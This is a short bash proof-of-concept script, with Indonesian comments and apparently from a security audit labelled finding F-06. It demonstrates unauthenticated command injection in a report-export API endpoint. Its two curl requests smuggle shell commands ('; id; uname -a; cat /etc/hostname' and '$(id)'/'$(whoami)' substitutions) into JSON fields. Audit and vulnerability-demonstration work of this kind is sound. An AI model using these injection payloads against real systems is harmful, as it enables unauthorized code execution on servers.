#!/usr/bin/env bash
# PoC F-06: command injection di endpoint ekspor laporan (RCE tanpa autentikasi).
# Pemakaian: BASE=http://localhost:3000 ./03_rce_export.sh
set -euo pipefail
BASE="${BASE:-http://localhost:3000}"

echo "=== POST /api/reports/export dengan payload shell ==="
curl -s -X POST "$BASE/api/reports/export" \
  -H 'Content-Type: application/json' \
  -d '{"filter":"; id; uname -a; cat /etc/hostname; #"}'
echo
echo "=== bukti alternatif: subcommand substitution ==="
curl -s -X POST "$BASE/api/reports/export" \
  -H 'Content-Type: application/json' \
  -d '{"type":"$(id)","format":"$(whoami)","filter":"x"}'
echo
